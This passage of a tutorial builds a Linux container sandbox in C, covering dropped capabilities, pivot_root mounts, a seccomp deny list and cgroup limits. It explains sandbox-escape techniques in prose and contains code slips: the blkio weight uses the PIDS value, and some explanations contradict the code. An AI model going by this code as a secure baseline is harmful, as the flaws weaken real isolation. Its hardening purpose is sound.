I was worried that <code>CAP_SETFCAP</code> could be used to add a capability to
an executable and <code>execve</code> it, but it's not actually possible for a
process to set capabilities it doesn't have<sup><a id="fnr.19" class="footref" href="#fn.19">19</a></sup>. But!
An executable altered this way could be executed by any unsandboxed
user, so I think it unacceptably undermines the security of the
system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 51: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SETFCAP,
</pre>
</div>

<p>
<code>CAP_SYSLOG</code> lets users perform destructive actions against the
syslog. Importantly, it doesn't prevent contained processes from
reading the syslog, which could be risky. It also exposes kernel
addresses, which could be used to circumvent kernel address layout
randomization<sup><a id="fnr.20" class="footref" href="#fn.20">20</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 54: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYSLOG,
</pre>
</div>

<p>
<code>CAP_SYS_ADMIN</code> allows many behaviors! We don't want most of them
(<code>mount</code>, <code>vm86</code>, etc). Some would be nice to have (<code>sethostname</code>,
<code>mount</code> for bind mounts&#x2026;) but the extra complexity doesn't seem
worth it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 55: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_ADMIN,
</pre>
</div>


<p>
<code>CAP_SYS_BOOT</code> allows programs to restart the system (the <code>reboot</code>
syscall) and load new kernels (the <code>kexec_load</code> and <code>kexec_file</code>
syscalls)<sup><a id="fnr.21" class="footref" href="#fn.21">21</a></sup>. We absolutely don't want
this. <code>reboot</code> is user-namespaced, and the <code>kexec*</code> functions only work
in the root user namespace, but neither of those help us.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 59: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_BOOT,
</pre>
</div>

<p>
<code>CAP_SYS_MODULE</code> is used by the syscalls <code>delete_module</code>,
<code>init_module</code>, <code>finit_module</code> <sup><a id="fnr.22" class="footref" href="#fn.22">22</a></sup>, by the code for <code>kmod</code> <sup><a id="fnr.23" class="footref" href="#fn.23">23</a></sup>,
and by the code for loading device modules with ioctl<sup><a id="fnr.24" class="footref" href="#fn.24">24</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 66: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_MODULE,
</pre>
</div>

<p>
<code>CAP_SYS_NICE</code> allows processes to set higher priority on given pids
than the default<sup><a id="fnr.25" class="footref" href="#fn.25">25</a></sup>. The default kernel scheduler
doesn't know anything about pid namespaces, so it's possible for a
contained process to deny service to the rest of the system<sup><a id="fnr.26" class="footref" href="#fn.26">26</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 71: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_NICE,
</pre>
</div>

<p>
<code>CAP_SYS_RAWIO</code> allows full access to the host systems memory with
<code>/proc/kcore</code>, <code>/dev/mem</code>, and <code>/dev/kmem</code> <sup><a id="fnr.27" class="footref" href="#fn.27">27</a></sup>, but a
contained process would need <code>mknod</code> to access these within the
namespace.<sup><a id="fnr.28" class="footref" href="#fn.28">28</a></sup>. But it also allows things like <code>iopl</code>
and <code>ioperm</code>, which give raw access to the IO ports<sup><a id="fnr.29" class="footref" href="#fn.29">29</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 76: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_RAWIO,
</pre>
</div>

<p>
<code>CAP_SYS_RESOURCE</code> specifically allows circumventing kernel-wide
limits, so we probably should drop it<sup><a id="fnr.30" class="footref" href="#fn.30">30</a></sup>. But I
don't think this can do more than DOS the
kernel, in general<sup><a id="fnr.31" class="footref" href="#fn.31">31</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 78: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_RESOURCE,
</pre>
</div>

<p>
<code>CAP_SYS_TIME</code>: setting the time isn't namespaced, so we should prevent
contained processes from altering the system-wide
time<sup><a id="fnr.32" class="footref" href="#fn.32">32</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 79: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_SYS_TIME,
</pre>
</div>

<p>
<code>CAP_WAKE_ALARM</code>, like <code>CAP_BLOCK_SUSPEND</code>, lets the contained process
interfere with suspend<sup><a id="fnr.33" class="footref" href="#fn.33">33</a></sup>, and we'd like to prevent that.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 81: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_WAKE_ALARM
	};
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 82: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	size_t num_caps = sizeof(drop_caps) / sizeof(*drop_caps);
	fprintf(stderr, "bounding...");
	for (size_t i = 0; i &lt; num_caps; i++) {
		if (prctl(PR_CAPBSET_DROP, drop_caps[i], 0, 0, 0)) {
			fprintf(stderr, "prctl failed: %m\n");
			return 1;
		}
	}
	fprintf(stderr, "inheritable...");
	cap_t caps = NULL;
	if (!(caps = cap_get_proc())
	    || cap_set_flag(caps, CAP_INHERITABLE, num_caps, drop_caps, CAP_CLEAR)
	    || cap_set_proc(caps)) {
		fprintf(stderr, "failed: %m\n");
		if (caps) cap_free(caps);
		return 1;
	}
	cap_free(caps);
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc6d2b81" class="outline-4">
<h4 id="orgc6d2b81">Retained Capabilities</h4>
<div class="outline-text-4" id="text-orgc6d2b81">
<p>
It's important to keep track of the capabilities I'm not dropping,
too.
</p>

<p>
I've heard multiple places<sup><a id="fnr.34" class="footref" href="#fn.34">34</a></sup> that <code>CAP_DAC_OVERRIDE</code>
might expose the same functionality as <code>CAP_DAC_READ_SEARCH</code>
(i.e. <code>open_by_handle_at</code>), but as far as I can tell that isn't
true. <code>shocker.c</code> doesn't get anywhere with only
<code>CAP_DAC_OVERRIDE</code> <sup><a id="fnr.35" class="footref" href="#fn.35">35</a></sup>, and the
only usage in the kernel is in the Unix permission-checking
code<sup><a id="fnr.36" class="footref" href="#fn.36">36</a></sup>. So my understanding is that
<code>CAP_DAC_OVERRIDE</code> on its own doesn't allow processes to read outside
of their mount namespaces ("DAC" or "Discretionary Access Control"
refers here to ordinary unix permissions).
</p>

<p>
<code>CAP_FOWNER</code>, <code>CAP_LEASE</code>, and <code>CAP_LINUX_IMMUTABLE</code> all operate on
files inside of the mount namespace.
</p>

<p>
Likewise, <code>CAP_SYS_PACCT</code> allows processes to switch accounting on and
off for itself. The <code>acct</code> system call takes a path to log to (which
must be within the mount namespace), and only operates on the calling
process. We're not using process accounting in our containerization,
so turning it off should be harmless as well.<sup><a id="fnr.37" class="footref" href="#fn.37">37</a></sup>
</p>

<p>
<code>CAP_IPC_OWNER</code> is only used by functions that respect IPC
namespaces<sup><a id="fnr.38" class="footref" href="#fn.38">38</a></sup>; since we're in a separate IPC namespace
from the host, we can allow this.
</p>

<p>
<code>CAP_NET_ADMIN</code> lets processes create network devices;
<code>CAP_NET_BIND_SERVICE</code> lets processes bind to low ports on those
devices; <code>CAP_NET_RAW</code> lets processes send raw packets on those
devices. Since we're going to isolate the networking with a virtual
bridge, and the contained process is inside of a network namespace,
these shouldn't be an issue<sup><a id="fnr.39" class="footref" href="#fn.39">39</a></sup>. I was wondering
whether we could recreate an existing device like <code>mknod</code> does, but I
don't think it's possible <sup><a id="fnr.40" class="footref" href="#fn.40">40</a></sup>.
</p>


<p>
<code>CAP_SYS_PTRACE</code> doesn't allow ptrace across pid
namespaces<sup><a id="fnr.41" class="footref" href="#fn.41">41</a></sup>. <code>CAP_KILL</code> doesn't allow signals across
pid namespaces<sup><a id="fnr.42" class="footref" href="#fn.42">42</a></sup>.
</p>

<p>
<code>CAP_SETUID</code> and <code>CAPSETGID</code> have similar behaviors<sup><a id="fnr.43" class="footref" href="#fn.43">43</a></sup>:
</p>
<ul class="org-ul">
<li><code>Make arbitrary manipulations of process UIDS and GIDs and
  supplementary GID list</code>, which will only apply to pids in the
namespace.</li>
<li><code>forge UID (GID) when passing socket credentials via UNIX domain
  sockets</code> the mount namespace should prevent us from reading the host
system's unix domain sockets.</li>
<li><code>write a user(group ID) mapping in a user namespace (see
  user_namespaces(7))</code>: this is <code>/proc/self/uid_map</code>, which will be
hidden inside the container.</li>
</ul>

<p>
<code>CAP_SETPCAP</code> only lets processes add or drop capabilities they
already effectively have; <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a> says
</p>
<blockquote>
<p>
If file capabilities are  supported: add any capability
from  the   calling  thread's   bounding  set   to  its
inheritable  set; drop  capabilities from  the bounding
set (via prctl(2) PR_CAPBSET_DROP); make changes to the
securebits flags.
</p>
</blockquote>
<p>
We've dropped everything relevant from the bounding set, and dropping
further capabilities should be harmless.
</p>

<p>
<code>CAP_SYS_CHROOT</code> is traditionally abused by changing root to a
directory with a setuid root binary and tampered-with dynamic
libraries<sup><a id="fnr.44" class="footref" href="#fn.44">44</a></sup>. Additionally, it can be used
to escape a chroot "jail"<sup><a id="fnr.45" class="footref" href="#fn.45">45</a></sup>. Neither of those
should be relevant in our setup so this should be harmless.
</p>

<p>
<a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">Brad Spengler, in "False Boundaries and Arbitrary Code Execution"</a> says
that <code>CAP_SYS_TTYCONFIG</code> can "temporarily change the keyboard
mapping of an administrator's tty via the KDSETKEYCODE ioctl to cause
a different command to be executed than intended", but again this is
an <code>ioctl</code> against a device that should be impossible to access within
the mount namespace.
</p>
</div>
</div>
</div>

<div id="outline-container-org00cc412" class="outline-3">
<h3 id="org00cc412">Mounts</h3>
<div class="outline-text-3" id="text-org00cc412">
<p>
The child process is in its own mount namespace, so we can unmount
things that it specifically shouldn't have access to. Here's how:
</p>

<ul class="org-ul">
<li>Create a temporary directory, and one inside of it.</li>
<li>Bind mount of the user argument onto the temporary directory</li>
<li><code>pivot_root</code>, making the bind mount our root and mounting the old
root onto the inner temporary directory.</li>
<li><code>umount</code> the old root, and remove the inner temporary directory.</li>
</ul>

<p>
But first we'll remount everything with <code>MS_PRIVATE</code>. This is mostly a
convenience, so that the bind mount is invisible outside of our
namespace.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 108: </span><code>&lt;&lt;mounts&gt;&gt;</code> =</label><pre class="src src-C">&lt;&lt;pivot-root&gt;&gt;

int mounts(struct child_config *config)
{
	fprintf(stderr, "=&gt; remounting everything with MS_PRIVATE...");
	if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
		fprintf(stderr, "failed! %m\n");
		return -1;
	}
	fprintf(stderr, "remounted.\n");

	fprintf(stderr, "=&gt; making a temp directory and a bind mount there...");
	char mount_dir[] = "/tmp/tmp.XXXXXX";
	if (!mkdtemp(mount_dir)) {
		fprintf(stderr, "failed making a directory!\n");
		return -1;
	}

	if (mount(config-&gt;mount_dir, mount_dir, NULL, MS_BIND | MS_PRIVATE, NULL)) {
		fprintf(stderr, "bind mount failed!\n");
		return -1;
	}

	char inner_mount_dir[] = "/tmp/tmp.XXXXXX/oldroot.XXXXXX";
	memcpy(inner_mount_dir, mount_dir, sizeof(mount_dir) - 1);
	if (!mkdtemp(inner_mount_dir)) {
		fprintf(stderr, "failed making the inner directory!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	fprintf(stderr, "=&gt; pivoting root...");
	if (pivot_root(mount_dir, inner_mount_dir)) {
		fprintf(stderr, "failed!\n");
		return -1;
	}
	fprintf(stderr, "done.\n");

	char *old_root_dir = basename(inner_mount_dir);
	char old_root[sizeof(inner_mount_dir) + 1] = { "/" };
	strcpy(&amp;old_root[1], old_root_dir);

	fprintf(stderr, "=&gt; unmounting %s...", old_root);
	if (chdir("/")) {
		fprintf(stderr, "chdir failed! %m\n");
		return -1;
	}
	if (umount2(old_root, MNT_DETACH)) {
		fprintf(stderr, "umount failed! %m\n");
		return -1;
	}
	if (rmdir(old_root)) {
		fprintf(stderr, "rmdir failed! %m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}

</pre>
</div>

<p>
<code>pivot_root</code> is a system call lets us swap the mount at <code>/</code> with
another. Glibc doesn't provide a wrapper for it, but includes a
prototype in the man page.  I don't really understand, but OK, we'll
include our own.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 109: </span><code>&lt;&lt;pivot-root&gt;&gt;</code> =</label><pre class="src src-C">int pivot_root(const char *new_root, const char *put_old)
{
	return syscall(SYS_pivot_root, new_root, put_old);
}

</pre>
</div>


<p>
It's worth noting that I'm avoiding packing and unpackaging
containers. This is fertile ground for
vulnerabilities<sup><a id="fnr.46" class="footref" href="#fn.46">46</a></sup>; I'll count on the user to
ensure that the mounted directory doesn't contain trusted or sensitive
files or hard links.
</p>
</div>
</div>


<div id="outline-container-org8504d16" class="outline-3">
<h3 id="org8504d16">System Calls</h3>
<div class="outline-text-3" id="text-org8504d16">
<p>
I'll be blacklisting system calls that I can demonstrate causing harm
or sandbox escapes. Again this isn't the best way to do this, but it
seems like the most illustrative.
</p>

<p>
<a href="https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md">Docker's documentation</a> and <a href="https://github.com/docker/docker/blob/b248de7e332b6e67b08a8981f68060e6ae629ccf/profiles/seccomp/default.json">default seccomp profile</a> are reasonable
sources for dangerous system calls<sup><a id="fnr.47" class="footref" href="#fn.47">47</a></sup>. They
also include obsolete sytem calls and calls that overlap with
restricted capabilities; I'll ignore those.
</p>
</div>


<div id="outline-container-org141a19c" class="outline-4">
<h4 id="org141a19c">Disallowed System Calls</h4>
<div class="outline-text-4" id="text-org141a19c">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 113: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">#define SCMP_FAIL SCMP_ACT_ERRNO(EPERM)

int syscalls()
{
	scmp_filter_ctx ctx = NULL;
	fprintf(stderr, "=&gt; filtering syscalls...");
	if (!(ctx = seccomp_init(SCMP_ACT_ALLOW))
</pre>
</div>

<p>
We want to prevent new setuid / setgid executables from being created,
since in the absence of user namespaces the contained process could
create a setuid binary that could be used by any user to get
root.<sup><a id="fnr.48" class="footref" href="#fn.48">48</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 116: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
</pre>
</div>

<p>
Allowing contained processes to start new user namespaces can allow
processes to gain new (albeit limited) capabilities, so we prevent
it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 117: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(unshare), 1,
				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
</pre>
</div>

<p>
<code>TIOCSTI</code> allows contained processes to write to the controlling
terminal<sup><a id="fnr.49" class="footref" href="#fn.49">49</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 121: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ioctl), 1,
				SCMP_A1(SCMP_CMP_MASKED_EQ, TIOCSTI, TIOCSTI))
</pre>
</div>

<p>
The kernel keyring system isn't namespaced.<sup><a id="fnr.50" class="footref" href="#fn.50">50</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 123: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)
</pre>
</div>

<p>
Before Linux 4.8, <code>ptrace</code> totally breaks seccomp<sup><a id="fnr.51" class="footref" href="#fn.51">51</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 127: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ptrace), 0)
</pre>
</div>

<p>
These system calls let processes assign NUMA nodes. I don't have
anything specific in mind, but I could see these being used to deny
service to some other NUMA-aware application on the host.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 128: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(mbind), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(migrate_pages), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(move_pages), 0)
	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(set_mempolicy), 0)
</pre>
</div>

<p>
<code>userfaultd</code> allows userspace to handle page
faults<sup><a id="fnr.52" class="footref" href="#fn.52">52</a></sup>. It doesn't require any privileges, so in
theory it should be safe to be called by an unprivileged user. But it
can be used to pause execution in the kernel by triggering page faults
in system calls. This is an important part in some kernel
exploits<sup><a id="fnr.53" class="footref" href="#fn.53">53</a></sup>. It's only rarely used legitimately, so
I'll disable it.
</p>


<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 130: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(userfaultfd), 0)
</pre>
</div>

<p>
I was initially worried about <code>perf_event_open</code> because the <a href="https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md">Docker
documentation says</a> it "could leak a lot of information on the host",
but it can't be used in our system to see information for
out-of-namespace processes<sup><a id="fnr.54" class="footref" href="#fn.54">54</a></sup>. But, if
<code>/proc/sys/kernel/perf_event_paranoid</code> is less than 2, it can be used
to discover kernel addresses and possibly uninitialized memory. 2 is
the default since is the default since 4.6, but it can be changed, and
relying on it seems like a bad idea<sup><a id="fnr.55" class="footref" href="#fn.55">55</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 135: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(perf_event_open), 0)
</pre>
</div>

<p>
We'll set <code>PR_SET_NO_NEW_PRIVS</code> to 0. The name is a little vague: it
specifically prevents <code>setuid</code> and <code>setcap</code>'d binaries from being
executed with their additional privileges. This has some security
benefits (it makes it harder for an unprivileged user in-container to
exploit a vulnerability in a setuid or setcap executable to become
in-container root, for example). But it's a little weird, and means
that, for example, <code>ping</code> won't work in a container for an
unprivileged user<sup><a id="fnr.56" class="footref" href="#fn.56">56</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 140: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_attr_set(ctx, SCMP_FLTATR_CTL_NNP, 0)
</pre>
</div>

<p>
And we'll actually apply it to the process, and release the context.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 141: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_load(ctx)) {
		if (ctx) seccomp_release(ctx);
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	seccomp_release(ctx);
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-org8ee812f" class="outline-4">
<h4 id="org8ee812f">Allowed System Calls</h4>
<div class="outline-text-4" id="text-org8ee812f">
<p>
Here are the system calls that are disallowed by the default Docker
policy but permitted by this code:
</p>

<p>
<code>_sysctl</code> is obsolete and disabled by
default<sup><a id="fnr.57" class="footref" href="#fn.57">57</a></sup>. <code>alloc_hugepages</code> and
<code>free_hugepages</code> <sup><a id="fnr.58" class="footref" href="#fn.58">58</a></sup>, <code>bdflush</code> <sup><a id="fnr.59" class="footref" href="#fn.59">59</a></sup>,
<code>create_module</code> <sup><a id="fnr.60" class="footref" href="#fn.60">60</a></sup>, <code>nfsservctl</code> <sup><a id="fnr.61" class="footref" href="#fn.61">61</a></sup>,
<code>perfctr</code> <sup><a id="fnr.62" class="footref" href="#fn.62">62</a></sup>, <code>get_kernel_syms</code> <sup><a id="fnr.63" class="footref" href="#fn.63">63</a></sup>, and
<code>setup</code> <sup><a id="fnr.64" class="footref" href="#fn.64">64</a></sup> are not present on modern Linux.
</p>

<p>
<code>clock_adjtime</code>, <code>clock_settime</code> <sup><a id="fnr.65" class="footref" href="#fn.65">65</a></sup>, and
<code>adjtime</code> <sup><a id="fnr.66" class="footref" href="#fn.66">66</a></sup> depend on <code>CAP_SYS_TIME</code>.
</p>

<p>
<code>pciconfig_read</code> and <code>pciconfig_write</code> <sup><a id="fnr.67" class="footref" href="#fn.67">67</a></sup> and all of the
side-effecting operations of <code>quotactl</code> <sup><a id="fnr.68" class="footref" href="#fn.68">68</a></sup> are prevented by
<code>CAP_SYS_ADMIN</code>.
</p>

<p>
<code>get_mempolicy</code> and <code>getpagesize</code> reveal information about the memory
layout of the system, but they can be made by unprivileged processes,
and are probably harmless. <code>pciconfig_iobase</code> can be made by
unprivileged processes, and reveals information about PCI decvices.
<code>ustat</code> <sup><a id="fnr.69" class="footref" href="#fn.69">69</a></sup> and <code>sysfs</code> <sup><a id="fnr.70" class="footref" href="#fn.70">70</a></sup> leak some information about
the filesystems, but are nothing that I see as critical. <code>uselib</code> is
more-or-less obsolete, but is just used for loading a shared library
in userspace <sup><a id="fnr.71" class="footref" href="#fn.71">71</a></sup>
</p>

<p>
<code>sync_file_range2</code> is <code>sync_file_range</code> with swapped argument
order<sup><a id="fnr.72" class="footref" href="#fn.72">72</a></sup>.
</p>

<p>
<code>readdir</code> is mostly obsolete, but probably harmless<sup><a id="fnr.73" class="footref" href="#fn.73">73</a></sup>.
</p>

<p>
<code>kexec_file_load</code> and <code>kexec_load</code> are prevented by
<code>CAP_SYS_BOOT</code> <sup><a id="fnr.74" class="footref" href="#fn.74">74</a></sup>.
</p>

<p>
<code>nice</code> can only be used to lower priority without
<code>CAP_SYS_NICE</code> <sup><a id="fnr.75" class="footref" href="#fn.75">75</a></sup>.
</p>

<p>
<code>oldfstat</code>, <code>oldlstat</code>, <code>oldolduname</code>, <code>oldstat</code>, and <code>olduname</code> are
just older versions of their respective functions. I expect them to
have the same security properties as the modern ones.
</p>

<p>
<code>perfmonctl</code> <sup><a id="fnr.76" class="footref" href="#fn.76">76</a></sup> is only available on
IA-64. <code>ppc_rtas</code> <sup><a id="fnr.77" class="footref" href="#fn.77">77</a></sup>, <code>spu_create</code> <sup><a id="fnr.78" class="footref" href="#fn.78">78</a></sup> and
<code>spu_run</code> <sup><a id="fnr.79" class="footref" href="#fn.79">79</a></sup>, and <code>subpage_prot</code> <sup><a id="fnr.80" class="footref" href="#fn.80">80</a></sup> are only
avaiable on PowerPC. <code>utrap_install</code> is only available on
Sparc<sup><a id="fnr.81" class="footref" href="#fn.81">81</a></sup>. <code>kern_features</code> is only available on
Sparc64, and should be harmless anyway<sup><a id="fnr.82" class="footref" href="#fn.82">82</a></sup>.
</p>

<p>
I don't believe <code>pivot_root</code> is a problem in our setup (but it could
probably be used to circumvent path-based MAC).
</p>

<p>
<code>preadv2</code> and <code>pwritev2</code> are just extensions to <code>preadv</code> and <code>pwritev</code>
/ <code>readv</code> and <code>writev</code>, which are "scatter input" / "gather output"
extensions to <code>read</code> and <code>write</code> <sup><a id="fnr.83" class="footref" href="#fn.83">83</a></sup>.
</p>
</div>
</div>
</div>

<div id="outline-container-org36fcb0f" class="outline-3">
<h3 id="org36fcb0f">Resources</h3>
<div class="outline-text-3" id="text-org36fcb0f">
<p>
We'd like to prevent badly-behaved child processes from denying
service to the rest of the system<sup><a id="fnr.84" class="footref" href="#fn.84">84</a></sup>. Cgroups let
us limit memory and cpu time in particular; limiting the pid count and
IO usage is also useful. <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">There's a very useful document in the kernel
tree about it</a>.
</p>

<p>
The <code>cgroup</code> and <code>cgroup2</code> filesystems are the canonical interfaces to
the cgroup system.  <code>cgroup2</code> is a little different, and unitialized
on my system, so I'll use the first version here.
</p>

<p>
Cgroup namespaces are a little different from, for example, mount
namespaces. We need to create the cgroup before we enter a cgroup
namespace; once we do, that cgroup will behave like the root cgroup
inside of the namespace<sup><a id="fnr.85" class="footref" href="#fn.85">85</a></sup>. This isn't the most
relevant, since a contained process can't mount the cgroup filesystem
or <code>/proc</code> for introspection, but it's nice to be thorough.
</p>

<p>
I'll set up a struct so I don't have to repeat myself too much, with
the following instructions:
</p>

<ul class="org-ul">
<li>Set <code>memory/$hostname/memory.limit_in_bytes</code>, so the contained
process and its child processes can't total more than 1GB memory in
userspace<sup><a id="fnr.86" class="footref" href="#fn.86">86</a></sup>.</li>
<li>Set <code>memory/$hostname/memory.kmem.limit_in_bytes</code>, so that the
contained process and its child processes can't total more than 1GB
memory in userspace<sup><a id="fnr.87" class="footref" href="#fn.87">87</a></sup>.</li>
<li>Set <code>cpu/$hostname/cpu.shares</code> to 256. CPU shares are chunks of
1024; 256 * 4 = 1024, so this lets the contained process take a
quarter of cpu-time on a busy system at most<sup><a id="fnr.88" class="footref" href="#fn.88">88</a></sup>.</li>
<li>Set the <code>pids/$hostname/pid.max</code>, allowing the contained process and
its children to have 64 pids at most. This is useful because there
are per-user pid limits that we could hit on the host if the
contained process occupies too many<sup><a id="fnr.89" class="footref" href="#fn.89">89</a></sup>.</li>
<li>Set <code>blkio/$hostname/weight</code> to 50, so that it's lower than the rest
of the system and prioritized accordingly<sup><a id="fnr.90" class="footref" href="#fn.90">90</a></sup>.</li>
</ul>

<p>
I'll also add the calling process for each of
<code>{memory,cpu,blkio,pids}/$hostname/tasks</code> by writing '0' to it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 181: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">#define MEMORY "1073741824"
#define SHARES "256"
#define PIDS "64"
#define WEIGHT "10"
#define FD_COUNT 64

struct cgrp_control {
	char control[256];
	struct cgrp_setting {
		char name[256];
		char value[256];
	} **settings;
};
struct cgrp_setting add_to_tasks = {
	.name = "tasks",
	.value = "0"
};

struct cgrp_control *cgrps[] = {
	&amp; (struct cgrp_control) {
		.control = "memory",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "memory.limit_in_bytes",
				.value = MEMORY
			},
			&amp; (struct cgrp_setting) {
				.name = "memory.kmem.limit_in_bytes",
				.value = MEMORY
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "cpu",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "cpu.shares",
				.value = SHARES
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "pids",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "pids.max",
				.value = PIDS
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "blkio",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "blkio.weight",
				.value = PIDS
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	NULL
};
</pre>
</div>


<p>
Writing to the cgroups version 1 filesystem works like
this<sup><a id="fnr.91" class="footref" href="#fn.91">91</a></sup>:
</p>
<ul class="org-ul">
